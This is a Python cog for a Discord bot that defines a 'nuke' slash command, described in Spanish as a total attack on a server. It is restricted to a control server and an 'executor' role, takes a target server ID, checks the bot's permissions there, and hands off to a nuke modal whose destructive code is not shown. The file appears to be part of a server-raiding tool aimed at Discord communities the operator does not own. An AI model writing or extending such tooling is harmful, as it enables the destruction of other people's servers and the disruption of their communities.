import nextcord
from nextcord.ext import commands, application_checks
from nextcord import Interaction, SlashOption

from config.config_handler import ConfigHandler
from middlewares.server_verification import ServerVerification
from components.modals.nuke_model import NukeModel
from middlewares.bot_permissions import BotPermissions
from utils.server_utils import ServerUtils

class Nuke(commands.Cog):
    
    config_handler = ConfigHandler()
    verifications = ServerVerification()
    permissions = BotPermissions()
    utils = ServerUtils()
    
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        
    @nextcord.slash_command(
        name = "nuke",
        description = "Ataque total sobre un servidor.",
        guild_ids = config_handler.get_CaC_server_id()
    )
    
    @application_checks.has_role(config_handler.get_executor_rol_id())
    async def nuke_command(self, ctx: Interaction, 
                    id: str = SlashOption(required = True, description = "Id del servidor objtivo.")):
        
        guild = self.utils.get_server(int(id), self.bot)
        
        self.verifications.check_command_execution_in_allowed_server(guild.id)
        self.verifications.check_bag(guild)
        
        if (not self.permissions.has_nuke_permissions(guild)
            and not self.permissions.has_administrator_permission):
                
            raise commands.BotMissingPermissions(["8"])
        
        modal = NukeModel(guild, self.bot)
        await ctx.response.send_modal(modal)
        
def setup(client):
    client.add_cog(Nuke(client))